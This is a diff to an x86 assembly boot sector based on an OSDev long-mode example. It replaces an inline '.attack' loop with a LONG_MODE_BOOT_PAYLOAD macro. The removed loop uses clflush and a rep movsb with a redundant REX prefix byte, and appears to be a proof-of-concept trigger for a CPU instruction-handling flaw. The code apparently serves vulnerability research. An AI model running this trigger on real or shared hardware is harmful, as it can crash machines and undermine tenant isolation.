@@ -1,4 +1,10 @@
 ; Stolen from https://wiki.osdev.org/Entering_Long_Mode_Directly
+%ifnmacro LONG_MODE_BOOT_PAYLOAD
+    %macro LONG_MODE_BOOT_PAYLOAD 0
+        nop
+    %endmacro
+%endif
+
 %define FREE_SPACE 0x9000
  
 ORG 0x7C00
@@ -159,42 +165,7 @@ LongMode:
     mov rax, 0x1F201F201F201F20       ; Set the value to set the screen to: Blue background, white foreground, blank spaces.
     rep stosq                         ; Clear the entire screen. 
  
-    ; Display "Hello World!"
-    mov edi, 0x00b8000              
- 
-    mov rax, 0x1F6C1F6C1F651F48    
-    mov [edi],rax
- 
-    mov rax, 0x1F6F1F571F201F6F
-    mov [edi + 8], rax
- 
-    mov rax, 0x1F211F641F6C1F72
-    mov [edi + 16], rax
- 
-        xor rbx, rbx
-        .attack:
-        xor ecx, ecx
-        lea rsi, [rsp+1]
-        mov rdi, rsi
-        .many_reptars:
-            align 64
-            ; 16 bytes
-            times 4 nop ; 4 bytes
-            dec rsi     ; 3 bytes
-            dec rdi     ; 3 bytes
-            inc rbx     ; 3 bytes
-            inc rcx     ; 3 bytes
-            ; 16 bytes
-            clflush [rdi]    ; 3 bytes
-            clflush [rsi+64] ; 4 bytes
-            ;mov [rsp], rbx   ; 4 bytes
-            rep              ; 1 byte
-            db 0x44; rex.r   ; 1 byte
-            movsb            ; 1 byte
-            rep              ; 1 byte
-            nop              ; 1 byte
-        mov dil, bl ; counter
-        jmp .attack
+    LONG_MODE_BOOT_PAYLOAD
 
 BITS 16
  
